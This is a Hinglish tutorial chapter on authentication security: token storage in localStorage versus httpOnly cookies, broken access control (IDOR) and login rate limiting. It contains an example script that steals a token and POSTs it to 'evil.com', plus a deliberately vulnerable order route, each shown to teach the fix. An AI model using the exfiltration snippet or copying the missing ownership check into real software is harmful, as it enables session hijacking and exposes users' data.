# Authentication and Token Security

**Module:** 23-Security
**Difficulty:** 🔴 Advanced
**Previous:** [02-Prototype-Pollution-and-CORS-Mistakes.md](./02-Prototype-Pollution-and-CORS-Mistakes.md)
**Next:** [04-Dependency-and-Data-Exposure.md](./04-Dependency-and-Data-Exposure.md)

---

## 1. Learning Objectives

- JWT/token storage ke security-tradeoffs samajhna (Module 19, chapter 03 se aage badhate hue).
- Authorization mistakes (broken access control) identify karna.
- Password aur token-related best practices ko consolidate karna.

## 2. Prerequisites

Module 19, chapter 03 (Authentication and Validation), Module 11, chapter 05 (Storage).

## 3. Concept in Simple Hinglish

Module 19 mein humne JWT-based authentication implement kiya tha. Is chapter mein hum us implementation ki **security-implications** ko deeply dekhenge — token kaha store karna chahiye, authorization checks kaise properly implement karni chahiye, aur common mistakes jo real-world breaches cause karte hain.

## 4. Technical Explanation

**Token Storage Options:**
- **`localStorage`:** Persistent, but JavaScript se accessible — **XSS-vulnerable** (Module 23, chapter 01 se connected).
- **`httpOnly` Cookie:** JavaScript se accessible **nahi** hai — XSS se protected, but **CSRF-vulnerable** (Module 23, chapter 01) agar properly configured na ho.

**Broken Access Control:** Jab application authentication (kaun ho) verify karti hai lekin authorization (kya karne ki permission hai) properly check nahi karti — ek common, critical vulnerability category.

## 5. Syntax

```js
// httpOnly cookie (set server-side, not accessible via JavaScript document.cookie)
res.cookie("token", jwtToken, { httpOnly: true, secure: true, sameSite: "strict" });
```

## 6. Basic Examples

```js
// ⚠️ localStorage — vulnerable if an XSS vulnerability exists anywhere in the app
localStorage.setItem("token", jwtToken);

// ✅ httpOnly cookie — safer against XSS, set by server
// res.cookie("token", jwtToken, { httpOnly: true });
```

## 7. Detailed Examples

**Why `localStorage` tokens are risky — connecting XSS to token theft:**
```js
// If ANY part of your application has an XSS vulnerability (Module 23, chapter 01)...
// ...an attacker's injected script can simply do this:
const stolenToken = localStorage.getItem("token");
fetch("https://evil.com/steal", { method: "POST", body: stolenToken });
// Now the attacker has the user's authentication token and can impersonate them!
```
**✅ Using `httpOnly` cookies instead:**
```js
// Server sets the cookie (Express example)
app.post("/login", (req, res) => {
  // ... verify credentials ...
  const token = generateToken(user);
  res.cookie("authToken", token, {
    httpOnly: true,  // JavaScript CANNOT access this — document.cookie won't show it!
    secure: true,     // Only sent over HTTPS
    sameSite: "strict" // Helps prevent CSRF (Module 23, chapter 01)
  });
  res.json({ message: "Logged in" });
});

// Even if an XSS vulnerability exists, `document.cookie` in the injected script
// simply won't include this httpOnly cookie — it's invisible to JavaScript entirely.
```

**Broken Access Control — the critical mistake (revisiting Module 19, chapter 03):**
```js
// ⚠️ VULNERABLE — checks authentication, but NOT authorization!
app.get("/orders/:orderId", authenticateToken, async (req, res) => {
  const order = await getOrderById(req.params.orderId);
  res.json(order); // Returns ANY order, regardless of who owns it!
});

// An attacker who is logged in (as ANY user) could access:
// GET /orders/1, /orders/2, /orders/3... and see EVERYONE's orders!
```
**✅ Fixed — proper authorization check:**
```js
app.get("/orders/:orderId", authenticateToken, async (req, res) => {
  const order = await getOrderById(req.params.orderId);

  if (!order) {
    return res.status(404).json({ error: "Order not found" });
  }

  if (order.userId !== req.user.userId) { // ✅ Verify OWNERSHIP, not just authentication!
    return res.status(403).json({ error: "Forbidden — this isn't your order" });
  }

  res.json(order);
});
```
Ye ek **extremely common real-world vulnerability** hai (called "Insecure Direct Object Reference" ya IDOR) — application confirm karta hai "user logged-in hai" (authentication), lekin bhool jaata hai check karna "kya ye specific resource is user ki hai" (authorization).

**Rate limiting login attempts — preventing brute-force attacks:**
```js
const loginAttempts = new Map(); // In production, use Redis or similar

function checkLoginRateLimit(email) {
  const attempts = loginAttempts.get(email) || 0;
  if (attempts >= 5) {
    throw new Error("Too many login attempts. Please try again later.");
  }
}

function recordFailedAttempt(email) {
  const attempts = loginAttempts.get(email) || 0;
  loginAttempts.set(email, attempts + 1);
}
```

## 8. Mental Model

Authentication vs Authorization ko socho ek **office building** — Authentication ID-card scan karke building mein enter karne deta hai ("tum employee ho"). Authorization decide karta hai **kaunse specific floors/rooms** tum access kar sakte ho ("tum floor 3 employee ho, floor 5 ke CEO-office mein enter nahi kar sakte, chahe tum authenticated ho"). Broken access control tab hota hai jab building sirf entrance pe check karta hai, andar kisi bhi room mein kisi ko bhi jaane deta hai.

## 9. What Happens Internally?

`httpOnly` flag browser ko instruct karta hai ki wo cookie ko `document.cookie` API se **completely hide** kare JavaScript se — sirf HTTP requests/responses ke through hi ye cookie server ke saath automatically exchange hota hai. `sameSite: "strict"` browser ko batata hai ki wo cookie ko cross-site requests mein **bilkul na bheje**, jo CSRF-protection add karta hai.

## 10. Common Mistakes

- Sensitive tokens ko `localStorage` mein store karna production applications mein (jaha XSS-risk realistically exist karta hai).
- Sirf authentication check karna (`req.user` exists?) aur authorization (`req.user` ownership/permission?) check karna bhool jaana.
- Login endpoints pe rate-limiting na lagana — brute-force password-guessing attacks ke against vulnerable rehna.

## 11. Edge Cases

`httpOnly` cookies bhi perfect nahi hain — agar attacker server ko directly compromise kar le, ya CSRF-protection properly na ho, risks abhi bhi exist karte hain. Security "layers" ki approach best hai — koi single measure "complete" security nahi deta.

## 12. Real-World Usage

Broken Access Control OWASP Top 10 mein consistently **#1 ya near-top** rank karta hai — ye real-world data breaches ka ek most-common cause hai (jaise ek user URL mein ID change karke dusre users ka data access kar leta hai). Production applications systematic authorization-checks har protected resource pe implement karte hain.

## 13. Comparison With Related Concepts

| Storage Method | XSS Risk | CSRF Risk |
|-------------------|-------------|---------------|
| `localStorage` | ⚠️ High | Low |
| `httpOnly` Cookie | Low | ⚠️ Moderate (mitigated by `sameSite`) |

## 14. Practice Questions

1. `httpOnly` cookie flag ka security-benefit kya hai?
2. Authentication aur Authorization mein kya difference hai (revisiting Module 16, chapter 04)?
3. "Insecure Direct Object Reference" (IDOR) vulnerability kya hai?

## 15. Challenge

Ek route `GET /profile/:userId` design karo (conceptually) jisme authentication check ho, aur authorization check bhi ho taaki user sirf apni khud ki profile access kar sake, dusre users ki nahi (jab tak wo "admin" role na ho).

## 16. Interview Questions

**Q1: `localStorage` mein authentication token store karna `httpOnly` cookie ke comparison mein kyun risky hai?**
A: `localStorage` **JavaScript-accessible** hai — koi bhi script jo page pe execute hoti hai (including attacker-injected XSS scripts) `localStorage.getItem()` se token seedha padh sakti hai aur attacker ko bhej sakti hai. `httpOnly` cookies **JavaScript se completely inaccessible** hain (`document.cookie` unhe show hi nahi karta) — chahe XSS vulnerability exist bhi kare, attacker ka injected script us specific cookie ko steal nahi kar sakta. Isliye sensitive authentication tokens ke liye `httpOnly` cookies generally safer choice hain, especially defense-in-depth ke liye.

**Q2: "Broken Access Control" kya hai aur ye kyun itna common/critical vulnerability hai?**
A: Broken Access Control tab hota hai jab application **authentication** verify karti hai (user logged-in hai) lekin properly **authorization** check nahi karti (kya ye specific user is specific resource ko access karne ki permission rakhta hai) — jaise ek user apna order-ID URL mein change karke kisi aur ka order dekh le, bina system ye check kiye ki order actually unka hai ya nahi. Ye critical hai kyunki implementation-wise ise miss karna bahut easy hai (developer "authentication check ho gaya" soch ke authorization bhool jaate hain), aur impact severe ho sakta hai (unauthorized data-access/modification across the entire user-base) — isi wajah se ye OWASP Top 10 mein consistently sabse critical vulnerabilities mein rehta hai.

## 17. Chapter Summary

Token storage choice (`localStorage` vs `httpOnly` cookies) XSS aur CSRF risks ke beech trade-offs involve karta hai — `httpOnly` cookies generally sensitive tokens ke liye safer hain. Broken Access Control (authentication check karna but authorization bhool jaana) ek extremely common, critical vulnerability hai — har protected resource pe explicit ownership/permission checks zaroori hain.

## 18. Revision Checklist

- [ ] `localStorage` vs `httpOnly` cookie ka XSS/CSRF trade-off clear hai.
- [ ] Authentication vs Authorization difference ek concrete example (IDOR) ke saath samajh gaya.
- [ ] Login rate-limiting ka basic pattern yaad hai.

---

**Next:** [04-Dependency-and-Data-Exposure.md](./04-Dependency-and-Data-Exposure.md)
